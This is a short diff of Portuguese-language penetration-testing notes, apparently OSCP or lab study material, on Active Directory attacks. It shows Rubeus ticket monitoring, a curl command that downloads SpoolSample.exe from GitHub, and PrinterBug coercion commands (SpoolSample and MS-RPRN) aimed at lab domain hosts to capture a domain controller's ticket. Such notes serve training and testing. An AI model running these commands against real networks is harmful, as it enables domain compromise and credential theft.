@@ -1431,10 +1431,14 @@ LEMBRAR DE MONITORAR COM O RUBEUS ANTES:
 ```
 .\Rubeus.exe  monitor /interval:5 /nowrap
 ```
-FORÇAR COMPUTADOR A SE AUTENTICAR NO OUTRO
+FORÇAR COMPUTADOR A SE AUTENTICAR NO OUTRO (PRINTERBUG)
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/SpoolSample.exe -Outfile SpoolSample.exe
 .\SpoolSample.exe tech-dc01 server02
+```
+ou (PRINTER BUG)
+```
+.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorpappsrv.dollarcorp.moneycorp.local
 ```
 IMPORTAR O TICKET DO DC:
 ```
